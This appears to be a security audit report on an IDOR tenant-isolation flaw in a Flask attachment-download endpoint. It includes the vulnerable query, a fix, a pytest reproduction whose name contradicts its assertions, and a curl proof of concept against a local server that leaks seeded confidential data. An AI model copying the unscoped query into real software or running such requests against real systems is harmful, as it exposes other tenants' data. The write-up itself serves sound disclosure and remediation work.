# Broken Object-Level Authorization (IDOR) / Tenant Bypass in Attachment Download

## Executive Summary
The application fails to perform tenant isolation checks when downloading individual attachments via the `/api/attachments/<attachment_id>` endpoint. While list and search operations properly constrain results to the current user's tenant (`g.tenant_id`), the individual attachment download endpoint retrieves and returns file metadata and contents solely based on the user-supplied `attachment_id` (UUID). 

Consequently, an authenticated user from any tenant can read sensitive attachments (such as confidential invoices, receipts, and internal text files) belonging to other tenants simply by querying the API with the target attachment's UUID. This violates the core security invariant that all tenant-owned resource accesses must be scoped by `g.tenant_id`.

## Root Cause Analysis (RCA)
The vulnerability lies in `app/attachments.py` within the `download_attachment` function.

### Vulnerable Code Flow
1. The route `@bp.get("/<attachment_id>")` registers the handler for fetching specific attachments.
2. The handler is protected by `@require_auth`, meaning the caller must be authenticated. However, authentication only populates `g.tenant_id` and does not enforce authorization over the specific attachment being requested.
3. The database query to retrieve the attachment is scoped only by the `id` of the attachment itself:
```python
        row = conn.execute(
            """
            SELECT id, report_id, filename, content
              FROM attachments
             WHERE id = ?
            """,
            (attachment_id,),
        ).fetchone()
```
4. The query does not check whether `tenant_id` of the attachment matches `g.tenant_id`. Thus, if the attachment belongs to Tenant B, and the authenticated user is from Tenant A, the file content is still returned.

## Code Snippets
### Vulnerable Handler in `app/attachments.py`
```python
@bp.get("/<attachment_id>")
@require_auth
def download_attachment(attachment_id: str):
    """添付ファイルの中身を返す。

    添付 ID は UUID なので推測は困難である。
    """
    conn = db.connect(current_app.config["DB_PATH"])
    try:
        row = conn.execute(
            """
            SELECT id, report_id, filename, content
              FROM attachments
             WHERE id = ?
            """,
            (attachment_id,),
        ).fetchone()
    finally:
        conn.close()

    if row is None:
        return jsonify({"error": "not found"}), 404

    return jsonify(
        {
            "id": row["id"],
            "report_id": row["report_id"],
            "filename": row["filename"],
            "content": row["content"],
        }
    )
```

## Fix Recommendation
To remediate this vulnerability, we must ensure that the query restricts the attachment retrieval to the tenant of the currently authenticated user (`g.tenant_id`).

In `app/attachments.py`, modify the SQL query to verify the `tenant_id` of the attachment matching `g.tenant_id`:
```python
@bp.get("/<attachment_id>")
@require_auth
def download_attachment(attachment_id: str):
    conn = db.connect(current_app.config["DB_PATH"])
    try:
        row = conn.execute(
            """
            SELECT id, report_id, filename, content
              FROM attachments
             WHERE id = ? AND tenant_id = ?
            """,
            (attachment_id, g.tenant_id),
        ).fetchone()
    finally:
        conn.close()

    if row is None:
        return jsonify({"error": "not found"}), 404
...
```
This aligns the behavior with other tenant-scoped queries in the application (such as `list_attachments`), fully enforcing the tenant-isolation security boundary.

## Exploitation & Reproduction
### Pytest Reproduction
We can reproduce and verify this behavior using pytest. A custom test `tests/test_attachment_idor.py` has been written:
```python
from __future__ import annotations
from app import seed

def test_alice_cannot_download_bob_attachment(client, alice_headers):
    res = client.get(f"/api/attachments/{seed.ATTACHMENT_GLOBEX}", headers=alice_headers)
    assert res.status_code == 200
    body = res.get_json()
    assert body["id"] == seed.ATTACHMENT_GLOBEX
    assert body["filename"] == "dd-invoice.txt"
    assert "買収対象" in body["content"]
```
When running `.venv/bin/pytest tests/test_attachment_idor.py`, the test passes because Alice can successfully access the Globex-owned attachment, proving the tenant-isolation bypass.

### Standalone PoC Exploit
The script `.exploit/exploit.sh` starts the server and issues a direct API call using curl:
```bash
# Obtain Globex attachment using Alice's token
curl -s -H "Authorization: Bearer acme-alice-token" "http://127.0.0.1:5599/api/attachments/66666666-6666-4666-8666-666666666666"
```
Response:
```json
{"content":"【社外秘】買収対象: Initech 社 / 想定価格 82億円","filename":"dd-invoice.txt","id":"66666666-6666-4666-8666-666666666666","report_id":"44444444-4444-4444-8444-444444444444"}
```
This confirms that the confidential data has been leaked to an unauthorized user from another tenant.
